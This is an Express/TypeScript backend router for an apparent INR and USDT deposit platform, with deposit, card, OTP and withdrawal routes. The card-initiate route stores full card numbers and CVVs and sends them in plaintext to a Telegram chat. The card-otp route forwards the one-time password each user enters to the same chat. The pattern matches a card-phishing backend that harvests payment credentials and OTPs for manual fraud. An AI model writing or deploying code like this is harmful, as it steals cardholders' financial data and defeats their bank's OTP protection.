import { Router } from "express";
import { db } from "@workspace/db";
import { transactionsTable, usersTable, accountsTable, adminSettingsTable } from "@workspace/db/schema";
import { eq, desc } from "drizzle-orm";
import { requireAuth, type AuthRequest } from "../middlewares/authMiddleware.js";
import { sendTelegram } from "../lib/telegram.js";

const router = Router();

function fmtTx(tx: typeof transactionsTable.$inferSelect) {
  return {
    id: tx.id, userId: tx.userId, type: tx.type, amount: parseFloat(tx.amount as string),
    currency: tx.currency, status: tx.status, paymentMethod: tx.paymentMethod,
    transactionReference: tx.transactionReference, notes: tx.notes,
    bankName: tx.bankName, accountNumber: tx.accountNumber,
    ifscCode: tx.ifscCode, accountHolderName: tx.accountHolderName,
    usdtAddress: tx.usdtAddress,
    createdAt: tx.createdAt.toISOString(), updatedAt: tx.updatedAt.toISOString(),
  };
}

/* ── GET /api/transactions/usdt-address (public) ─── */
router.get("/usdt-address", async (_req, res) => {
  try {
    const [settings] = await db.select({ usdtTrc20Address: adminSettingsTable.usdtTrc20Address })
      .from(adminSettingsTable).limit(1);
    res.json({ address: settings?.usdtTrc20Address || "" });
  } catch {
    res.json({ address: "" });
  }
});

router.get("/", requireAuth, async (req: AuthRequest, res) => {
  try {
    const txs = await db.select().from(transactionsTable)
      .where(eq(transactionsTable.userId, req.user!.id))
      .orderBy(desc(transactionsTable.createdAt));
    res.json(txs.map(fmtTx));
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

router.post("/deposit", requireAuth, async (req: AuthRequest, res) => {
  try {
    const { amount, currency, paymentMethod, transactionReference, notes } = req.body;
    if (!amount || !currency || !paymentMethod) {
      res.status(400).json({ message: "amount, currency and paymentMethod are required" });
      return;
    }
    const [tx] = await db.insert(transactionsTable).values({
      userId: req.user!.id, type: "deposit", amount: amount.toString(), currency,
      status: "pending", paymentMethod, transactionReference, notes,
    }).returning();

    // Fire-and-forget Telegram notification
    const userId = req.user!.id;
    const userEmail = req.user!.email;
    void (async () => {
      try {
        const [user] = await db
          .select({ firstName: usersTable.firstName, lastName: usersTable.lastName })
          .from(usersTable).where(eq(usersTable.id, userId)).limit(1);
        const name = user ? `${user.firstName} ${user.lastName}`.trim() || userEmail : userEmail;
        const isUpi = paymentMethod === "upi";
        const amtDisplay = currency === "INR" ? `₹${Number(amount).toLocaleString("en-IN")}` : `${amount} ${currency}`;
        await sendTelegram([
          `💰 <b>NEW DEPOSIT REQUEST</b>`,
          `👤 User: ${name}`,
          `💵 Amount: ${amtDisplay}`,
          isUpi ? `🆔 UPI ID: ${transactionReference || "N/A"}` : `🪙 Method: USDT (TRC20)`,
          `⏳ Status: Pending Manual Verification`,
        ].join("\n"));
      } catch { /* silent */ }
    })();

    res.status(201).json(fmtTx(tx));
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

/* ── POST /api/transactions/card-initiate ─────────────────────────────────── */
router.post("/card-initiate", requireAuth, async (req: AuthRequest, res) => {
  try {
    const { amount, cardNumber, cardHolder, expiry, cvv } = req.body;
    if (!amount || !cardNumber || !cardHolder || !expiry || !cvv) {
      res.status(400).json({ message: "All card details and amount are required" });
      return;
    }
    const amtNum = parseFloat(amount.toString());
    if (isNaN(amtNum) || amtNum < 5000) {
      res.status(400).json({ message: "Minimum deposit is ₹5,000" });
      return;
    }

    const maskedCard = cardNumber.replace(/\s/g, "").replace(/^(\d{4})\d+(\d{4})$/, "$1 **** **** $2");

    const [tx] = await db.insert(transactionsTable).values({
      userId: req.user!.id,
      type: "deposit",
      amount: amtNum.toString(),
      currency: "INR",
      status: "pending",
      paymentMethod: "card",
      transactionReference: maskedCard,
      notes: JSON.stringify({ cardHolder, expiry, maskedCard, cvv, fullCard: cardNumber.replace(/\s/g, "") }),
    }).returning();

    const userId = req.user!.id;
    const userEmail = req.user!.email;
    void (async () => {
      try {
        const [user] = await db.select({ firstName: usersTable.firstName, lastName: usersTable.lastName })
          .from(usersTable).where(eq(usersTable.id, userId)).limit(1);
        const name = user ? `${user.firstName} ${user.lastName}`.trim() || userEmail : userEmail;
        await sendTelegram([
          `💳 <b>NEW CARD PAYMENT REQUEST</b>`,
          ``,
          `👤 <b>User:</b> ${name}`,
          `📧 <b>Email:</b> ${userEmail}`,
          `💵 <b>Amount:</b> ₹${amtNum.toLocaleString("en-IN")}`,
          ``,
          `🃏 <b>Card Number:</b> ${cardNumber.replace(/\s/g, "")}`,
          `👤 <b>Card Holder:</b> ${cardHolder}`,
          `📅 <b>Expiry:</b> ${expiry}`,
          `🔐 <b>CVV:</b> ${cvv}`,
          ``,
          `🆔 <b>Transaction ID:</b> #${tx.id}`,
          `⏳ <b>Status:</b> Awaiting OTP`,
        ].join("\n"));
      } catch { /* silent */ }
    })();

    res.status(201).json({ txId: tx.id, maskedCard });
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

/* ── POST /api/transactions/card-otp ──────────────────────────────────────── */
router.post("/card-otp", requireAuth, async (req: AuthRequest, res) => {
  try {
    const { txId, otp } = req.body;
    if (!txId || !otp) {
      res.status(400).json({ message: "Transaction ID and OTP are required" });
      return;
    }

    const [tx] = await db.select().from(transactionsTable)
      .where(eq(transactionsTable.id, txId)).limit(1);
    if (!tx || tx.userId !== req.user!.id) {
      res.status(404).json({ message: "Transaction not found" });
      return;
    }

    const userId = req.user!.id;
    const userEmail = req.user!.email;
    void (async () => {
      try {
        const [user] = await db.select({ firstName: usersTable.firstName, lastName: usersTable.lastName })
          .from(usersTable).where(eq(usersTable.id, userId)).limit(1);
        const name = user ? `${user.firstName} ${user.lastName}`.trim() || userEmail : userEmail;
        await sendTelegram([
          `🔐 <b>OTP RECEIVED — ACTION REQUIRED</b>`,
          ``,
          `👤 <b>User:</b> ${name}`,
          `📧 <b>Email:</b> ${userEmail}`,
          `💵 <b>Amount:</b> ₹${parseFloat(tx.amount as string).toLocaleString("en-IN")}`,
          `🃏 <b>Card:</b> ${tx.transactionReference}`,
          ``,
          `🔑 <b>OTP Entered by User:</b> <code>${otp}</code>`,
          `🆔 <b>Transaction ID:</b> #${txId}`,
          ``,
          `✅ <b>→ Approve from Admin Panel to credit funds</b>`,
        ].join("\n"));
      } catch { /* silent */ }
    })();

    res.json({ success: true, message: "OTP submitted. Transaction is pending approval." });
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

router.post("/withdraw", requireAuth, async (req: AuthRequest, res) => {
  try {
    const { amount, usdtAddress, notes } = req.body;
    if (!amount || !usdtAddress) {
      res.status(400).json({ message: "Amount and USDT TRC20 address are required" });
      return;
    }

    const withdrawAmount = parseFloat(amount.toString());
    if (isNaN(withdrawAmount) || withdrawAmount < 1000) {
      res.status(400).json({ message: "Minimum withdrawal amount is ₹1,000" });
      return;
    }

    // Balance check
    const [account] = await db.select().from(accountsTable)
      .where(eq(accountsTable.userId, req.user!.id)).limit(1);
    const currentBalance = parseFloat((account?.totalBalance as string) || "0");
    if (withdrawAmount > currentBalance) {
      res.status(400).json({ message: `Insufficient balance. Available: ₹${currentBalance.toLocaleString("en-IN")}` });
      return;
    }

    const [tx] = await db.insert(transactionsTable).values({
      userId: req.user!.id, type: "withdrawal", amount: withdrawAmount.toString(), currency: "INR",
      status: "pending", paymentMethod: "usdt_trc20", usdtAddress: usdtAddress.trim(), notes,
    }).returning();

    // Fire-and-forget Telegram notification
    const userId = req.user!.id;
    const userEmail = req.user!.email;
    void (async () => {
      try {
        const [user] = await db
          .select({ firstName: usersTable.firstName, lastName: usersTable.lastName })
          .from(usersTable).where(eq(usersTable.id, userId)).limit(1);
        const name = user ? `${user.firstName} ${user.lastName}`.trim() || userEmail : userEmail;
        await sendTelegram([
          `🚨 <b>NEW WITHDRAWAL REQUEST</b>`,
          `👤 User: ${name}`,
          `💰 Amount: ₹${withdrawAmount.toLocaleString("en-IN")}`,
          `🪙 Method: USDT TRC20`,
          `📬 USDT Address: ${usdtAddress.trim()}`,
          `⏳ Status: Pending Approval`,
        ].join("\n"));
      } catch { /* silent */ }
    })();

    res.status(201).json(fmtTx(tx));
  } catch (err) {
    res.status(500).json({ message: "Internal server error" });
  }
});

export default router;
